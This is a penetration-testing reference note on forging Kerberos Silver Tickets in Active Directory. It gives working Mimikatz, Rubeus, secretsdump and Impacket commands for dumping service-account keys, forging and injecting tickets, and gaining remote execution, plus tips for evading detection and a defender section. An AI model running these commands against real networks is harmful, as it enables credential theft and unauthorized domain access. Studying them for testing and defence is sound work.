---
created: 2026-08-06
updated: 2026-10-11
tags:
  - AD
  - AD_attacks
  - Kerberos
---
## Silver Ticket

> A **Silver Ticket** attack is a post-exploitation technique in which an attacker who holds a **service account's long-term key** forges a **Kerberos Service Ticket (ST)** for that account's service, impersonating an arbitrary user to that one service — without ever contacting the KDC.

- Every Service Ticket is **encrypted with the long-term key of the account that runs the target service**, and it carries a PAC signed with that same key.
- The target service decrypts the ST with its own key and trusts the identity and group memberships recorded inside the PAC. It normally doesn't call back to the KDC to re-validate the ticket.
- Whoever holds the service account's key can therefore **forge an ST the service will accept as genuine**, authoring the PAC to claim any identity and any group membership.

>[!important] A NT (RC4), AES-128, or AES-256 key of the **service account** is sufficient for the attack — the `krbtgt` key is not needed.

>[!note] See [[Kerberos#Service Tickets (STs)]] and [[Kerberos#Privilege Attribute Certificate (PAC)]].

- Since you author and sign that PAC with the service's own key, you control every authorization field inside the ticket: you can claim to be `Administrator`, a member of `Domain Admins`, or the holder of any SID — but only as far as this one service is concerned.

>[!note] The forged ST is called a **Silver Ticket**.

- Unlike a Golden Ticket, its scope is narrow: a Silver Ticket grants access to **a single service on a single host** — the service whose key you hold. It can't be exchanged for other tickets, and it's useless against any other service.
- It survives password resets of the impersonated user and remains valid until the **service account's own password** is rotated.

>[!note] See [[Kerberos]].

> [!note] A Silver Ticket is a **post-exploitation** technique. You must already hold the target service account's key — e.g., a machine account hash dumped from a compromised host, or a service account password recovered via [[Kerberoasting]].

> [!note]- Golden Ticket vs. Silver Ticket
> - **Silver Ticket** forges a **ST (Service Ticket)** with a **service account's key**. It grants access to just one specific service on a single host. The attack doesn't involve connecting to the KDC, since the ticket is presented directly to the target service during the AP exchange.
> - **[[Golden Ticket]]** forges a **TGT (Ticket Granting Ticket)** with the `krbtgt` key. It can be exchanged with the KDC for STs to **any Kerberos service in the domain**, granting domain-wide access.
>
>>[!note] See [[Golden Ticket]].

> [!important] Because the forged ST is presented directly to the service during the AP exchange (see [[Kerberos#3. AP exchange (KRBAPREQ / KRBAPREP)]]), the attack never reach the KDC — no `KRB_AS_REQ`/`KRB_TGS_REQ` is sent, so no Event ID `4768`/`4769` is logged on the DC for the forged session. This makes Silver Tickets stealthier than Golden Tickets.

- Prerequisites for the attack:
	- The target **service account's long-term key** — its NT hash (RC4) or, preferably, its AES-128/AES-256 key.
	- The **domain SID** (e.g. `S-1-5-21-3842939050-3880317879-2865463114`).
	- The **domain FQDN** (e.g. `example.com`) and a target **username** to impersonate.
	- The target **SPN** — the service class plus host, e.g. `cifs/server01.example.com` (see [[Kerberos#SPNs]]).
	- Network reach to the **target service**. The DC is *not* required.
	- The DNS must be configured correctly (Kerberos requires FQDNs to operate).

>[!important] The forged ST is obtained offline, not through a TGS exchange with the KDC. You inject the ticket directly into the Kerberos cache and present it straight to the target service.

> [!important] The impersonated account doesn't need to exist in the domain for the forged ticket to be cryptographically valid, but forging a **real, privileged account** (classically `Administrator`, RID `500`) with realistic group memberships is far more reliable — especially where PAC validation is enforced.

>[!warning] Microsoft's November 2022 security updates ([CVE-2022-37967](https://www.cve.org/CVERecord?id=CVE-2022-37967)) introduced a full PAC signature: an additional cryptographic signature on the Kerberos Privilege Attribute Certificate (PAC), generated using the `krbtgt` account key. A patched service that validates this signature can reject a Silver Ticket forged using only the service account key. Tools such as Rubeus provide `/nofullpacsig` to omit the signature, but this works only where the target does not enforce its validation.

> [!warning] Microsoft's November 2022 updates (CVE-2022-37967) added a **full PAC signature** computed with the `krbtgt` key. Where a patched service expects and validates this signature, a Silver Ticket forged with only the service account key can be rejected. Tools expose flags to omit it (e.g. Rubeus `/nofullpacsig`), which only helps against hosts that don't enforce the check.

## Executing the Silver Ticket attack
### Obtaining the service account key

- The key you need is the long-term key of **the account under which the target service runs**:
	- Services such as **CIFS, HOST, RPCSS, HTTP, WSMAN** on a member host run as the **machine account** (`HOST$`) — you need the computer account's NT hash or AES key.
	- Dedicated services such as **MSSQLSvc** run under a **domain service account** — you need that account's key.

- Dump the **machine account** key from a compromised host (local admin / SYSTEM) with `secretsdump.py`, which reads the `$MACHINE.ACC` LSA secret:

```bash
secretsdump.py 'example.com/administrator:Password123!@server01.example.com'
```

- Or DCSync the machine account from a DC:

```bash
secretsdump.py -just-dc-user 'SERVER01$' example.com/jdoe@dc01.example.com
```

>[!note] See [[DCSync]].

- Or dump the key locally with Mimikatz on the host (requires `SeDebugPrivilege`):

```powershell
privilege::debug
```
```powershell
sekurlsa::logonpasswords
```
```powershell
lsadump::secrets
```

- For a **dedicated service account**, recover its password offline via Kerberoasting, then use the resulting NT hash (or derive its AES key):

```bash
GetUserSPNs.py -request -dc-ip 172.16.5.5 example.com/jdoe
```

>[!note] See [[Kerberoasting]].

### Obtaining the domain SID

- Like a Golden Ticket, a forged Silver Ticket must carry the correct domain SID so the PAC's SIDs and group memberships match the domain's known identifiers.
- To obtain the domain SID:

```powershell
whoami /user
```

```powershell
(Get-ADDomain).DomainSID.Value
```

```bash
rpcclient -U '' <DC_IP_address>
rpcclient $> lookupdomain CORP
```

> [!tip]+
> - A domain SID looks like `S-1-5-21-3842939050-3880317879-2865463114`; a full account SID is a domain SID + the account's RID, e.g. the `Administrator`'s SID is `<domain_SID>-500`.

### Choosing the target service (SPN)

- A Silver Ticket is bound to a single **SPN**: a service class plus a host. The service class you forge decides what you can do on that host, so pick the class that runs under the account whose key you hold.

| Operation                                    | Required SPN service class(es)       |
| -------------------------------------------- | ------------------------------------ |
| Access file shares (`C$`, `ADMIN$`)          | `CIFS`                               |
| Create scheduled tasks                       | `HOST`                               |
| Run PsExec / control services                | `HOST` + `CIFS`                      |
| Execute WMI                                  | `HOST` + `RPCSS`                     |
| Open a WinRM / PowerShell Remoting session   | `HOST` + `HTTP` (sometimes `WSMAN`)  |
| Perform LDAP operations, including DCSync    | `LDAP`                               |
| Use Remote Server Administration Tools       | `RPCSS` + `LDAP` + `CIFS`            |

> [!tip] A `LDAP` Silver Ticket forged with a **Domain Controller's machine account** key lets you run [[DCSync]] against that DC without the `krbtgt` key — though obtaining a DC's machine account key usually already implies domain compromise.

### Forging the Silver Ticket

#### Mimikatz (from Windows)

- Mimikatz forges Silver Tickets with the same [`kerberos::golden`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden) module: supplying `/target` and `/service` (and the **service account** key via `/rc4` or `/aes256`) produces an ST instead of a TGT. The module can inject the forged ticket directly into the current logon session (`/ptt`).

- Forge and inject a CIFS Silver Ticket using the machine account **NT hash (RC4)**:

```powershell
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:server01.example.com /service:cifs /rc4:b7e9a1c0d4f2e3a5b6c7d8e9f0a1b2c3 /id:500 /ptt
```

- Forge and inject using the machine account **AES-256 key**:

```powershell
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:server01.example.com /service:cifs /aes256:5e3d2096ebb2c4e3fb1cff61f1ac35e6e... /id:500 /ptt
```

- Forge and **save to a `.kirbi` file** instead of injecting (for later use in a [[Pass-the-Ticket]] attack):

```powershell
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:server01.example.com /service:cifs /rc4:b7e9a1c0d4f2e3a5b6c7d8e9f0a1b2c3 /id:500 /ticket:silver.kirbi
```

| Option               | Description                                                              |
| -------------------- | ----------------------------------------------------------------------- |
| `/user`              | Set the username to impersonate inside the ticket.                      |
| `/domain`            | Specify the target domain FQDN.                                         |
| `/sid`               | Provide the domain SID.                                                 |
| `/target`            | Set the target host FQDN (the service's host).                         |
| `/service`           | Set the SPN service class to forge (`cifs`, `host`, `http`, `mssqlsvc`, `ldap`, …). |
| `/rc4`               | Supply the service account's NT hash (forge an RC4-encrypted ST).      |
| `/aes128`, `/aes256` | Supply the service account's AES key instead (preferred).             |
| `/id`                | Set the RID of the impersonated user (`500` for `Administrator`).       |
| `/groups`            | Embed group RIDs in the PAC (default `513,512,520,518,519`).            |
| `/ptt`               | Inject the forged ticket into the current session.                      |
| `/ticket`            | Save the forged ticket to a file.                                       |

>[!important] For a Silver Ticket, `/rc4` or `/aes256` is the **service account's** key (e.g., the machine account for `cifs`/`host`), *not* the `krbtgt` key.

#### Rubeus (from Windows)

- [`Rubeus`](https://github.com/GhostPack/Rubeus) has a dedicated `silver` command. Its `/service` takes the **full SPN**.

- Forge and inject a CIFS Silver Ticket using the machine account NT hash:

```powershell
Rubeus.exe silver /service:cifs/server01.example.com /rc4:b7e9a1c0d4f2e3a5b6c7d8e9f0a1b2c3 /sid:S-1-5-21-3842939050-3880317879-2865463114 /user:Administrator /id:500 /domain:example.com /ptt
```

- Forge and inject using the machine account AES-256 key:

```powershell
Rubeus.exe silver /service:cifs/server01.example.com /aes256:5e3d2096ebb2c4e3fb1cff61f1ac35e6e... /sid:S-1-5-21-3842939050-3880317879-2865463114 /user:Administrator /id:500 /domain:example.com /ptt
```

- Query the DC over **LDAP** to populate the PAC with the impersonated user's real group memberships and metadata:

```powershell
Rubeus.exe silver /service:cifs/server01.example.com /rc4:b7e9a1c0d4f2e3a5b6c7d8e9f0a1b2c3 /sid:S-1-5-21-3842939050-3880317879-2865463114 /user:Administrator /domain:example.com /ldap /ptt
```

| Option            | Description                                                                 |
| ----------------- | -------------------------------------------------------------------------- |
| `/service:`       | Full SPN of the target service (`cifs/server01.example.com`).              |
| `/rc4:`           | Service account NT hash (RC4 key); aliases `/ntlm:`.                       |
| `/aes128:`        | Forge with the service account AES-128 key.                                |
| `/aes256:`        | Forge with the service account AES-256 key (preferred).                    |
| `/sid:`           | Domain SID.                                                                |
| `/user:`          | Username to impersonate.                                                   |
| `/id:`            | RID of the impersonated user.                                              |
| `/groups:`        | Group RIDs to embed in the PAC.                                            |
| `/domain:`        | Target domain FQDN.                                                        |
| `/ldap`           | Query the DC via LDAP to auto-fill realistic PAC data.                     |
| `/nofullpacsig`   | Omit the full PAC signature (for targets not enforcing the Nov 2022 check).|
| `/ptt`            | Inject the forged ticket into the current session.                        |
| `/outfile:`       | Save the forged ticket to a file.                                          |

### Impacket `ticketer.py` (from Linux)

- To forge Silver Tickets from Linux, use Impacket's [`ticketer.py`](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) with `-spn`. The rest mirrors the Golden Ticket invocation but uses the **service account** key. It saves the forged ST to a `.ccache` file named after the impersonated user.

- Forge a Silver Ticket using the machine account NT hash:

```bash
ticketer.py -nthash b7e9a1c0d4f2e3a5b6c7d8e9f0a1b2c3 -domain-sid S-1-5-21-3842939050-3880317879-2865463114 -domain example.com -spn cifs/server01.example.com Administrator
```

- Forge a Silver Ticket using the machine account AES-256 key:

```bash
ticketer.py -aesKey 5e3d2096ebb2c4e3fb1cff61f1ac35e6e... -domain-sid S-1-5-21-3842939050-3880317879-2865463114 -domain example.com -spn cifs/server01.example.com Administrator
```

- Point `KRB5CCNAME` at the forged ticket and use it with any Kerberos-aware Impacket tool (`-k -no-pass`):

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
psexec.py -k -no-pass example.com/Administrator@server01.example.com
```

| Option        | Description                                                            |
| ------------- | --------------------------------------------------------------------- |
| `-nthash`     | Service account NT hash (forge an RC4-encrypted ST).                  |
| `-aesKey`     | Service account AES-128/AES-256 key (preferred).                      |
| `-domain-sid` | Domain SID.                                                           |
| `-domain`     | Target domain FQDN.                                                   |
| `-spn`        | Target SPN (`cifs/server01.example.com`); this is what makes it a Silver Ticket. |
| `-groups`     | Comma-separated group RIDs for the PAC (default `513,512,520,518,519`).|
| `-user-id`    | RID of the impersonated user (`500` for `Administrator`).             |

> [!note] The trailing positional argument (`Administrator` above) is the username to impersonate; the resulting file is `Administrator.ccache`.

### Using the forged ticket

### On Windows

- Confirm the forged ST is present in the Kerberos cache:

```cmd
klist
```

- With a `CIFS` Silver Ticket, access the target host's file system as the impersonated user:

```cmd
dir \\server01.example.com\c$
```

- With a `HOST` + `HTTP` Silver Ticket, open a remoting session:

```powershell
Enter-PSSession -ComputerName server01.example.com
```

- With a `HOST` Silver Ticket, create a scheduled task on the target:

```cmd
schtasks /create /s server01.example.com /tn task /tr "cmd /c ..." /sc ONSTART /ru SYSTEM
```

### On Linux

- With `KRB5CCNAME` set to the `.ccache`, verify and use it through Impacket (`-k -no-pass`), matching the tool to the forged SPN class:

```bash
klist
```

```bash
psexec.py -k -no-pass example.com/Administrator@server01.example.com
```

```bash
wmiexec.py -k -no-pass example.com/Administrator@server01.example.com
```

> [!important] The forged **SPN must match the service you connect to**, and you must reach the host by its **FQDN** with working **DNS resolution** and **clock synchronization** with the host (within ~5 minutes). See [[Pass-the-Ticket]].

## Detection considerations

- A forged Silver Ticket leaves fewer traces than a Golden Ticket, because it never reaches the DC. Detection shifts from the DC to the **target host**. When operating with stealth in mind, consider the following:

	- **No KDC traffic**
		- Since the ST is forged offline and presented directly to the service, no `KRB_AS_REQ`/`KRB_TGS_REQ` is sent — there's no Event ID `4768` or `4769` on the DC for that session.
		- From the defender's side, a Kerberos logon observed on a host (Event ID `4624`, logon type `3`) with **no corresponding `4769` service ticket request on the DC** is a strong Silver Ticket indicator.

	- **RC4 encryption**
		- By default, legacy tools forge the ST with RC4 (`rc4-hmac`/`0x17`). In environments where AES is standard, an RC4-encrypted service ticket is noticeable.
		- To avoid detection, forge tickets using the service account's **AES-256 key**, if available (`/aes256` in Mimikatz/Rubeus or `-aesKey` in `ticketer.py`).

	- **PAC integrity and the full PAC signature**
		- Forging arbitrary non-existent accounts or inventing group memberships can trigger alerts or fail PAC validation where it's enforced. Impersonate existing privileged accounts (e.g. the built-in `Administrator`, RID `500`), and use Rubeus's `/ldap` to populate the PAC with real data.
		- After the November 2022 updates (CVE-2022-37967), patched services may expect a **full PAC signature** signed with the `krbtgt` key. Where this is enforced, a Silver Ticket built with only the service key is rejected.

	- **Optional PAC validation**
		- If the service performs **PAC validation** (calling the DC over Netlogon, `KERB_VERIFY_PAC`), a forged PAC can be caught. This check is frequently disabled for performance, which is precisely what makes the attack viable.

- Mitigations: rotate **machine account passwords** (default every 30 days), use **gMSAs** with frequent automatic rotation for service accounts, enforce **AES** encryption, and enable **PAC validation** and **full PAC signatures**.

## References and further reading

- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
- [`Silver ticket — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)
- [`Kerberos Silver Tickets — ADSecurity (Sean Metcalf)`](https://adsecurity.org/?p=2011)
- [`Mimikatz — gentilkiwi GitHub`](https://github.com/gentilkiwi/mimikatz)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket ticketer.py — Fortra GitHub`](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [`KB5020805: How to manage Kerberos protocol changes related to CVE-2022-37967 — Microsoft Support`](https://support.microsoft.com/en-us/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb)
- [`Event 4769 — A Kerberos service ticket was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
